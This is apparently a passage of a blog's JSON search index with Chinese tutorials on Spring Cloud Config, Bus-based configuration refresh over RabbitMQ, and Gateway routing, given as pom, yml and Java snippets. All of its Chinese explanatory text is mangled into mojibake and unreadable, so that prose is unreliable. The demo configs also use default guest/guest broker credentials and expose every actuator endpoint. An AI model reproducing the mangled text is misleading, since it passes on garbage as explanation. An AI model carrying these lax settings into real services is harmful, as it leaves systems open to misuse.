include: &quot;*&quot; ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.EnableEurekaClient; @EnableEurekaClient @SpringBootApplication public class ConfigClientMain3366 { public static void main(String[] args) { SpringApplication.run( ConfigClientMain3366.class,args); } } controller package com.kayleh.springcloud.controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.context.config.annotation.RefreshScope; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RefreshScope public class ConfigClientController { @Value(&quot;${server.port}&quot;) private String serverPort; @Value(&quot;${config.info}&quot;) private String configInfo; @GetMapping(&quot;/configInfo&quot;) public String getConfigInfo(){ return &quot;serverPort:&quot;+serverPort+&quot;\\t\\n\\n configInfo: &quot;+configInfo; } } è®¾è®¡æ€æƒ³1) åˆ©ç”¨æ¶ˆæ¯æ€»çº¿è§¦å‘ä¸€ä¸ªå®¢æˆ·ç«¯/bus/refresh,è€Œåˆ·æ–°æ‰€æœ‰å®¢æˆ·ç«¯çš„é…ç½® 1597386232917 1597386240399 2) åˆ©ç”¨æ¶ˆæ¯æ€»çº¿è§¦å‘ä¸€ä¸ªæœåŠ¡ç«¯ConfigServerçš„/bus/refreshç«¯ç‚¹,è€Œåˆ·æ–°æ‰€æœ‰å®¢æˆ·ç«¯çš„é…ç½®ï¼ˆæ›´åŠ æ¨èï¼‰ 1597386285571 1597386240399 å›¾äºŒçš„æ¶æ„æ˜¾ç„¶æ›´åŠ åˆé€‚ï¼Œå›¾ä¸€ä¸é€‚åˆçš„åŸå› å¦‚ä¸‹æ‰“ç ´äº†å¾®æœåŠ¡çš„èŒè´£å•ä¸€æ€§ï¼Œå› ä¸ºå¾®æœåŠ¡æœ¬èº«æ˜¯ä¸šåŠ¡æ¨¡å—ï¼Œå®ƒæœ¬ä¸åº”è¯¥æ‰¿æ‹…é…ç½®åˆ·æ–°èŒè´£ ç ´åäº†å¾®æœåŠ¡å„èŠ‚ç‚¹çš„å¯¹ç­‰æ€§ æœ‰ä¸€å®šçš„å±€é™æ€§ã€‚ä¾‹å¦‚ï¼Œå¾®æœåŠ¡åœ¨è¿ç§»æ—¶ï¼Œå®ƒçš„ç½‘ç»œåœ°å€å¸¸å¸¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ­¤æ—¶å¦‚æœæƒ³è¦åšåˆ°è‡ªåŠ¨åˆ·æ–°ï¼Œé‚£å°±ä¼šå¢åŠ æ›´å¤šçš„ä¿®æ”¹ ç»™cloud-config-center-3344é…ç½®ä¸­å¿ƒæœåŠ¡ç«¯æ·»åŠ æ¶ˆæ¯æ€»çº¿æ”¯æŒpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt; &lt;/dependency&gt; yml server: port: 3344 spring: application: name: cloud-config-center cloud: config: server: git: uri: https://github.com/hhf19906/springcloud-config.git #git@github.com:hhf19906/springcloud-config.git search-paths: - springcloud-config label: master rabbitmq: host: localhost port: 5672 username: guest password: guest eureka: client: service-url: defaultZone: http://localhost:7001/eureka management: endpoints: web: exposure: include: &#39;bus-refresh&#39; ç»™cloud-config-center-3355å®¢æˆ·ç«¯æ·»åŠ æ¶ˆæ¯æ€»çº¿æ”¯æŒpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt; &lt;/dependency&gt; bootstrap.yml server: port: 3355 spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 rabbitmq: host: localhost port: 5672 username: guest password: guest eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eureka management: endpoints: web: exposure: include: &quot;*&quot; ç»™cloud-config-center-3366å®¢æˆ·ç«¯æ·»åŠ æ¶ˆæ¯æ€»çº¿æ”¯æŒpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt; &lt;/dependency&gt; yml server: port: 3366 spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 rabbitmq: host: localhost port: 5672 username: guest password: guest eureka: client: service-url: defaultZone: http://localhost:7001/eureka management: endpoints: web: exposure: include: &#39;*&#39; æµ‹è¯• è¿ç»´å·¥ç¨‹å¸ˆ ä¿®æ”¹Githubä¸Šé…ç½®æ–‡ä»¶å¢åŠ ç‰ˆæœ¬å· å‘é€Postè¯·æ±‚ å›¾åƒ curl -X POST &quot;http://localhost:3344/actuator/bus-refresh&quot; é…ç½®ä¸­å¿ƒ http://config-3344.com/config-dev.yml å®¢æˆ·ç«¯ http://localhost:3355/configInfo http://localhost:3366/configInfo è·å–é…ç½®ä¿¡æ¯ï¼Œå‘ç°éƒ½å·²ç»åˆ·æ–°äº† ä¸€æ¬¡å‘é€ï¼Œå¤„å¤„ç”Ÿæ•ˆ SpringCloud BusåŠ¨æ€åˆ·æ–°å®šç‚¹é€šçŸ¥ä¸æƒ³å…¨éƒ¨é€šçŸ¥ï¼Œåªæƒ³å®šç‚¹é€šçŸ¥,åªé€šçŸ¥3355, ä¸é€šçŸ¥3366 ç®€å•ä¸€å¥è¯. æŒ‡å®šå…·ä½“æŸä¸€ä¸ªå®ä¾‹ç”Ÿæ•ˆè€Œä¸æ˜¯å…¨éƒ¨ å…¬å¼ï¼šhttp://localhost:é…ç½®ä¸­å¿ƒçš„ç«¯å£å·/actuator/bus-refresh/{destination} /bus/refreshè¯·æ±‚ä¸å†å‘é€åˆ°å…·ä½“çš„æœåŠ¡å®ä¾‹ä¸Šï¼Œè€Œæ˜¯å‘ç»™config serverå¹¶é€šè¿‡destinationå‚æ•°ç±»æŒ‡å®šéœ€è¦æ›´æ–°é…ç½®çš„æœåŠ¡æˆ–å®ä¾‹ æˆ‘ä»¬è¿™é‡Œä»¥åˆ·æ–°è¿è¡Œåœ¨3355ç«¯å£ä¸Šçš„config-clientä¸ºä¾‹. åªé€šçŸ¥3355, ä¸é€šçŸ¥3366 1597386973424 curl -X POST &quot;http://localhost:3344/actuator/bus-refresh/config-client:3355&quot; é€šçŸ¥æ€»ç»“All1597387025181","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud configåˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒ","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„5","date":"2020-08-14T07:26:05.000Z","updated":"2021-04-11T17:11:28.711Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„5/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%845/","excerpt":"SpringCloud configåˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒ","text":"SpringCloud configåˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒ åˆ†å¸ƒå¼ç³»ç»Ÿé¢ä¸´çš„é…ç½®é—®é¢˜1597116784397 1597116831303 1597116840717 èƒ½å¹²å˜›ï¼Ÿé›†ä¸­ç®¡ç†é…ç½®æ–‡ä»¶ ä¸åŒç¯å¢ƒä¸åŒé…ç½®ï¼ŒåŠ¨æ€åŒ–çš„é…ç½®æ›´æ–°ï¼Œåˆ†ç¯å¢ƒéƒ¨ç½²æ¯”å¦‚dev/test/prod/beta/release è¿è¡ŒæœŸé—´åŠ¨æ€è°ƒæ•´é…ç½®ï¼Œä¸å†éœ€è¦åœ¨æ¯ä¸ªæœåŠ¡éƒ¨ç½²çš„æœºå™¨ä¸Šç¼–å†™é…ç½®æ–‡ä»¶ï¼ŒæœåŠ¡ä¼šå‘é…ç½®ä¸­å¿ƒç»Ÿä¸€æ‹‰å–é…ç½®è‡ªå·±çš„ä¿¡æ¯ å½“é…ç½®å‘ç”Ÿå˜åŠ¨æ—¶ï¼ŒæœåŠ¡ä¸éœ€è¦é‡å¯å³å¯æ„ŸçŸ¥åˆ°é…ç½®çš„å˜åŒ–å¹¶åº”ç”¨æ–°çš„é…ç½® å°†é…ç½®ä¿¡æ¯ä»¥RESTæ¥å£çš„å½¢å¼æš´éœ²ï¼Œpostã€curlè®¿é—®åˆ·æ–°å‡å¯â€¦. ä¸Githubæ•´åˆé…ç½®ç”±äºSpringCloud Configé»˜è®¤ä½¿ç”¨Gitæ¥å­˜å‚¨é…ç½®æ–‡ä»¶ï¼ˆä¹Ÿæœ‰å…¶å®ƒæ–¹å¼ï¼Œæ¯”å¦‚æ”¯æŒsvnå’Œæœ¬åœ°æ–‡ä»¶ï¼Œä½†æœ€æ¨èçš„è¿˜æ˜¯Gitï¼Œè€Œä¸”ä½¿ç”¨çš„æ˜¯http/httpsè®¿é—®çš„å½¢å¼ï¼‰ ConfigæœåŠ¡ç«¯é…ç½®ä¸æµ‹è¯•1.ç”¨ä½ è‡ªå·±çš„è´¦å·åœ¨Githubä¸Šæ–°å»ºä¸€ä¸ªåä¸ºsprincloud-configçš„æ–°Repository 2.ç”±ä¸Šä¸€æ­¥è·å¾—åˆšæ–°å»ºçš„gitåœ°å€ï¼Œå†™ä½ è‡ªå·±çš„ä»“åº“åœ°å€ 3.æœ¬åœ°ç¡¬ç›˜ä¸Šæ–°å»ºgitä»“åº“å¹¶cloneï¼Œ æœ¬åœ°åœ°å€ï¼šD:\\44\\SpringCloud2020 gitå‘½ä»¤ git clone xxx 4.æ­¤æ—¶åœ¨æœ¬åœ°Dç›˜ç¬¦ä¸‹D:\\44\\SpringCloud2020\\springcloud-config 1597305038489 è¡¨ç¤ºå¤šä¸ªç¯å¢ƒçš„é…ç½®æ–‡ä»¶,ä¿å­˜æ ¼å¼å¿…é¡»ä¸ºUTF-8,å¦‚æœéœ€è¦ä¿®æ”¹ï¼Œ æ­¤å¤„æ¨¡æ‹Ÿè¿ç»´äººå‘˜æ“ä½œgitå’Œgithub git add git commit -m â€œinit ymlâ€ git push origin master 5.æ–°å»ºModuleæ¨¡å—cloud-config-center-3344å®ƒæ—¢ä¸ºCloudçš„é…ç½®ä¸­å¿ƒæ¨¡å—cloudConfig Center pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 3344 spring: application: name: cloud-config-center cloud: config: server: git: # uri: git@github.com:Kayleh/springcloud-config.git #å¡«å†™ä½ è‡ªå·±çš„githubè·¯å¾„ uri: https://github.com/Kayleh/springcloud-config.git #å¡«å†™ä½ è‡ªå·±çš„githubè·¯å¾„ search-paths: - springcloud-config username: Kayleh password: #å¯†ç  label: master eureka: client: service-url: defaultZone: http://localhost:7001/eureka ä¸»å¯åŠ¨ç±»: @EnableConfigServer package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.config.server.EnableConfigServer; @SpringBootApplication @EnableConfigServer public class ConfigCenterMain3344 { public static void main(String[] args) { SpringApplication.run(ConfigCenterMain3344 .class,args); } } windowsä¸‹ä¿®æ”¹hostsæ–‡ä»¶ï¼Œå¢åŠ æ˜ å°„ 127.0.0.1 config-3344.com æµ‹è¯•é€šè¿‡Configå¾®æœåŠ¡æ˜¯å¦å¯ä»¥ä»Githubä¸Šè·å–é…ç½®å†…å®¹ å¯åŠ¨å¾®æœåŠ¡3344 http://config-3344.com:3344/master/config-dev.yml é…ç½®è¯»å–è§„åˆ™1597305257005 1597305264686 /{label}/{application}-{profile}.ymlï¼ˆæœ€æ¨èä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰ masteråˆ†æ”¯ http://config-3344.com:3344/master/config-dev.yml http://config-3344.com:3344/master/config-test.yml http://config-3344.com:3344/master/config-prod.yml devåˆ†æ”¯ http://config-3344.com:3344/dev/config-dev.yml http://config-3344.com:3344/dev/config-test.yml http://config-3344.com:3344/dev/config-prod.yml /{application}-{profile}.yml http://config-3344.com:3344/config-dev.yml http://config-3344.com:3344/config-test.yml http://config-3344.com:3344/config-prod.yml http://config-3344.com:3344/config-xxxx.yml(ä¸å­˜åœ¨çš„é…ç½®) /{application}-{profile}[/{label}] http://config-3344.com:3344/config/dev/master http://config-3344.com:3344/config/test/master http://config-3344.com:3344/config/prod/master é‡è¦é…ç½®ç»†èŠ‚æ€»ç»“ 1597305464178 æˆåŠŸå®ç°äº†ç”¨SpringCloud Config é€šè¿‡GitHubè·å–é…ç½®ä¿¡æ¯ Configå®¢æˆ·ç«¯é…ç½®ä¸æµ‹è¯•æ–°å»ºcloud-config-client-3355 pom &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; bootstap.yml æ˜¯ä»€ä¹ˆ? 1597305556768 server: port: 3355 spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eureka 1597305596684 ä¿®æ”¹config-dev.ymlé…ç½®å¹¶æäº¤åˆ°GitHubä¸­ï¼Œæ¯”å¦‚åŠ ä¸ªå˜é‡ageæˆ–è€…ç‰ˆæœ¬å·version ä¸»å¯åŠ¨ç±»: package com.kayleh.springcloud; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class ConfigClientMain3355 { public static void main(String[] args) { SpringApplication.run( ConfigClientMain3355.class,args); } } ä¸šåŠ¡ç±» package com.kayleh.springcloud.Controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class ConfigClientController { @Value(&quot;${config.info}&quot;) private String configInfo; @GetMapping(&quot;/configInfo&quot;) public String getConfigInfo(){ return configInfo; } } å¯åŠ¨Configé…ç½®ä¸­å¿ƒ3344å¾®æœåŠ¡å¹¶è‡ªæµ‹ http://config-3344.com:3344/master/config-dev.yml http://config-3344.com:3344/master/config-test.yml å¯åŠ¨3355ä½œä¸ºClientå‡†å¤‡è®¿é—® http://localhost:3355/configInfo æˆåŠŸå®ç°äº†å®¢æˆ·ç«¯3355è®¿é—®SpringCloud Config3344é€šè¿‡GitHubè·å–é…ç½®ä¿¡æ¯ é—®é¢˜éšæ—¶è€Œæ¥ï¼Œåˆ†å¸ƒå¼é…ç½®çš„åŠ¨æ€åˆ·æ–° Linuxè¿ç»´ä¿®æ”¹GitHubä¸Šçš„é…ç½®æ–‡ä»¶å†…å®¹åšè°ƒæ•´ åˆ·æ–°3344ï¼Œå‘ç°ConfigServeré…ç½®ä¸­å¿ƒç«‹åˆ»å“åº” åˆ·æ–°3355ï¼Œå‘ç°ConfigServerå®¢æˆ·ç«¯æ²¡æœ‰ä»»ä½•å“åº” 3355æ²¡æœ‰å˜åŒ–é™¤éè‡ªå·±é‡å¯æˆ–è€…é‡æ–°åŠ è½½ éš¾é“æ¯æ¬¡è¿ç»´ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå®¢æˆ·ç«¯éƒ½éœ€è¦é‡å¯ï¼Ÿï¼Ÿå™©æ¢¦ Configå®¢æˆ·ç«¯ä¹‹åŠ¨æ€åˆ·æ–°é¿å…æ¯æ¬¡æ›´æ–°é…ç½®éƒ½è¦é‡å¯å®¢æˆ·ç«¯å¾®æœåŠ¡3355 ä¿®æ”¹3355æ¨¡å— POMå¼•å…¥actuatorç›‘æ§ &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; ä¿®æ”¹YMLï¼Œæš´éœ²ç›‘æ§ç«¯å£ server: port: 3355 spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eureka management: endpoints: web: exposure: include: &quot;*&quot; @RefreshScopeä¸šåŠ¡ç±»Controllerä¿®æ”¹ package com.kayleh.springcloud.Controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.context.config.annotation.RefreshScope; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RefreshScope @RestController public class ConfigClientController { @Value(&quot;${config.info}&quot;) private String configInfo; @GetMapping(&quot;/configInfo&quot;) public String getConfigInfo(){ return configInfo; } } æ­¤æ—¶ä¿®æ”¹å»github æµ‹è¯•3344 å’Œ3355 http://config-3344.com:3344/master/config-dev.yml http://localhost:3355/configInfo 3355æ²¡æœ‰æ”¹å˜ï¼Œ(åªæœ‰é‡å¯æ‰æœ‰æ•ˆæœï¼‰ éœ€è¦è¿ç»´äººå‘˜å‘é€Postè¯·æ±‚åˆ·æ–°3355,å¿…é¡»æ˜¯Postè¯·æ±‚ curl -X POST &quot;http://localhost:3355/actuator/refresh&quot; å†æ¬¡http://localhost:3355/configInfo æˆåŠŸå®ç°äº†å®¢æˆ·ç«¯3355åˆ·æ–°åˆ°æœ€æ–°é…ç½®å†…å®¹,é¿å…äº†æœåŠ¡çš„é‡å¯ æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ å‡å¦‚æœ‰å¤šä¸ªå¾®æœåŠ¡å®¢æˆ·ç«¯3355/3366/3377ã€‚ã€‚ã€‚ã€‚ æ¯ä¸ªå¾®æœåŠ¡éƒ½è¦æ‰§è¡Œä¸€æ¬¡postè¯·æ±‚ï¼Œæ‰‹åŠ¨åˆ·æ–°ï¼Ÿ å¯å¦å¹¿æ’­ï¼Œä¸€æ¬¡é€šçŸ¥ï¼Œå¤„å¤„ç”Ÿæ•ˆï¼Ÿ æˆ‘ä»¬æƒ³å¤§èŒƒå›´çš„è‡ªåŠ¨åˆ·æ–°ï¼Œæ±‚æ–¹æ³•","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"GateWayæœåŠ¡é™æµ","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„4","date":"2020-08-14T07:21:47.000Z","updated":"2021-04-11T17:11:28.706Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„4/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%844/","excerpt":"GateWayæœåŠ¡é™æµ","text":"GateWayæœåŠ¡é™æµ ç§’æ€é«˜å¹¶å‘ç­‰æ“ä½œ,ä¸¥ç¦ä¸€çªèœ‚çš„è¿‡æ¥æ‹¥æŒ¤,å¤§å®¶æ’é˜Ÿ,ä¸€ç§’é’ŸNä¸ª,æœ‰åºè¿›è¡Œ.flowlimit GatewayGatewayæ˜¯åœ¨Springç”Ÿæ€ç³»ç»Ÿä¹‹ä¸Šæ„å»ºçš„APIç½‘å…³æœåŠ¡ï¼ŒåŸºäºSpring 5ï¼ŒSpring Boot 2å’Œ Project Reactorç­‰æŠ€æœ¯ã€‚ Gatewayæ—¨åœ¨æä¾›ä¸€ç§ç®€å•è€Œæœ‰æ•ˆçš„æ–¹å¼æ¥å¯¹APIè¿›è¡Œè·¯ç”±ï¼Œä»¥åŠæä¾›ä¸€äº›å¼ºå¤§çš„è¿‡æ»¤å™¨åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šç†”æ–­ã€é™æµã€é‡è¯•ç­‰ã€‚ 1596980807123 SpringCloud Gateway ä½¿ç”¨çš„æ˜¯Webfluxä¸­çš„reactor-nettyå“åº”å¼ç¼–ç¨‹ç»„ä»¶ï¼Œåº•å±‚ä½¿ç”¨äº†Nettyé€šè®¯æ¡†æ¶ã€‚ 1596981084802 1596981218641 1596982261551 Gatewayï¼š 1596982457962 Gatewayçš„ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µRoute(è·¯ç”±)è·¯ç”±æ˜¯æ„å»ºç½‘å…³çš„åŸºæœ¬æ¨¡å—ï¼Œå®ƒç”±IDï¼Œç›®æ ‡URIï¼Œä¸€ç³»åˆ—çš„æ–­è¨€å’Œè¿‡æ»¤å™¨ç»„æˆï¼Œå¦‚æœæ–­è¨€ä¸ºtrueåˆ™åŒ¹é…è¯¥è·¯ç”±ã€‚ Predicateï¼ˆæ–­è¨€ï¼‰å‚è€ƒçš„æ˜¯java8çš„java.util.function.Predicateå¼€å‘äººå‘˜å¯ä»¥åŒ¹é…HTTPè¯·æ±‚ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ˆä¾‹å¦‚è¯·æ±‚å¤´æˆ–è¯·æ±‚å‚æ•°ï¼‰ï¼Œå¦‚æœè¯·æ±‚ä¸æ–­è¨€ç›¸åŒ¹é…åˆ™è¿›è¡Œè·¯ç”± Filter(è¿‡æ»¤)æŒ‡çš„æ˜¯Springæ¡†æ¶ä¸­GatewayFilterçš„å®ä¾‹ï¼Œä½¿ç”¨è¿‡æ»¤å™¨ï¼Œå¯ä»¥åœ¨è¯·æ±‚è¢«è·¯ç”±å‰æˆ–è€…ä¹‹åå¯¹è¯·æ±‚è¿›è¡Œä¿®æ”¹ã€‚ 1597041510243 å·¥ä½œæµç¨‹1597041530900 æ ¸å¿ƒé€»è¾‘ è·¯ç”±è½¬å‘+æ‰§è¡Œè¿‡æ»¤å™¨é“¾ æ–°å»ºcloud-gateway-gateway9527 pom(ç§»é™¤äº†webä¾èµ–) &lt;dependencies&gt; &lt;!--æ–°å¢gateway--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 9527 spring: application: name: cloud-gateway eureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka æ— ä¸šåŠ¡ç±» ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud; @SpringBootApplication @EnableEurekaClient public class GateWayMain9527 { public static void main(String[] args) { SpringApplication.run(GateWayMain9527.class, args); } } è§‚å¯Ÿcloud-provider-payment8001çš„controllerçš„get/lbè®¿é—®è·¯å¾„ ç›®å‰ä¸æƒ³æš´éœ²8001ç«¯å£ï¼Œå¸Œæœ›åœ¨8001å¤–é¢å¥—ä¸€å±‚9527 ä¿®æ”¹pom.xml server: port: 9527 spring: application: name: cloud-gateway cloud: gateway: routes: - id: payment_routh #è·¯ç”±çš„IDï¼Œæ²¡æœ‰å›ºå®šè§„åˆ™ä½†è¦æ±‚å”¯ä¸€ï¼Œå»ºè®®é…åˆæœåŠ¡å uri: http://localhost:8001 #åŒ¹é…åæä¾›æœåŠ¡çš„è·¯ç”±åœ°å€ predicates: - Path=/payment/get/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± - id: payment_routh2 uri: http://localhost:8001 predicates: - Path=/payment/lb/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± eureka: instance: hostname: cloud-gateway-service client: #æœåŠ¡æä¾›è€…æ³¨å†Œè¿›eurekaæœåŠ¡åˆ—è¡¨å†… service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka æµ‹è¯• æ·»åŠ ç½‘å…³å‰ http://localhost:8001/payment/get/31 æ·»åŠ ç½‘å…³å http://localhost:9527/payment/get/31 1597043412245 é™¤äº†ä½¿ç”¨yamlçš„æ–¹æ³•é…ç½®è¿˜å¯ä»¥ä½¿ç”¨ä»£ç é…ç½®ï¼š9527 package com.kayleh.springcloud.config; @Configuration public class GateWayConfig { @Bean public RouteLocator customRouteLocator(RouteLocatorBuilder routeLocatorBuilder) { RouteLocatorBuilder.Builder routes = routeLocatorBuilder.routes(); routes.route(&quot;path_rote_kayleh&quot;, r -&gt; r.path(&quot;/guonei&quot;) .uri(&quot;http://news.baidu.com/guonei&quot;)).build(); return routes.build(); } } æµ‹è¯• http://localhost:9527/guonei é€šè¿‡å¾®æœåŠ¡åå®ç°åŠ¨æ€è·¯ç”±é»˜è®¤æƒ…å†µä¸‹Gatewayä¼šæ ¹æ®æ³¨å†Œä¸­å¿ƒçš„æœåŠ¡åˆ—è¡¨ï¼Œä»¥æ³¨å†Œä¸­å¿ƒä¸Šå¾®æœåŠ¡åä¸ºè·¯å¾„åˆ›å»ºåŠ¨æ€è·¯ç”±è¿›è¡Œè½¬å‘ï¼Œä»è€Œå®ç°åŠ¨æ€è·¯ç”±çš„åŠŸèƒ½ ä¿®æ”¹yaml server: port: 9527 